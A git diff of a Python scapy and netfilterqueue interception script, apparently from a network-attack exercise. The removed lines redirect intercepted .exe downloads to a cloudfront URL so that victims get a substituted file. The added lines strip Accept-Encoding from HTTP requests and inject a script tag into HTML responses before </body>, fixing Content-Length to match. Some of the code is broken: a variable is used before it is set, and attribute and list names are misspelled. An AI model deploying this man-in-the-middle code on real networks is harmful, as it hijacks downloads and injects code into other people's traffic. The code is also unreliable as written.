@@ -21,22 +21,25 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("HTTP Request")
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] exe Request")
-                ask_list.append(scapy_packet[scapy.TCP].ack)
-                # print(scapy_packet.show())
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Responce")
-            if scapy_packet[scapy.TCP].sec in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].sec)
-                print("[+] Replacing file")
-                # print(scapy_packet.show())
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://d22ti63kw1h9x5.cloudfront.net\n\n")
-                
-                packet.set_payload(str(scapy_packet))
-            print(scapy_packet.show())
+            print("[+] Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            # print(scapy_packet.show())
 
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+] Response")
+            # print(scapy_packet.show())
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+            # print(scapy_packet.show())
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
